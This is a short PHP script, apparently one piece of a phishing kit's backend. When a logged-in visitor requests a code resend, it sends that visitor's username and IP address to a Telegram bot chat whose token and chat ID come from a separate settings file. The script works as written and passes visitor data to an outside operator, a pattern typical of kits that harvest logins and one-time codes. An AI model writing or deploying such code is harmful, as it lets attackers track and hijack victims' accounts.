<?php
// ===== reenvio.php =====
// Notifica al bot que el usuario solicitó reenvío de código
session_start();
include("settings.php"); // $token y $chat_id

header('Content-Type: application/json; charset=utf-8');

$usuario = $_SESSION['usuario'] ?? null;
$ip      = $_SERVER['REMOTE_ADDR'];

if (!$usuario) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'sin_sesion']);
    exit;
}

$msg = "🔁 REENVÍO solicitado\n👤 Usuario: $usuario\n🌐 IP: $ip";

$resp = @file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text'    => $msg
]));

if ($resp === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'telegram_fail']);
    exit;
}

echo json_encode(['ok' => true, 'usuario' => $usuario]);
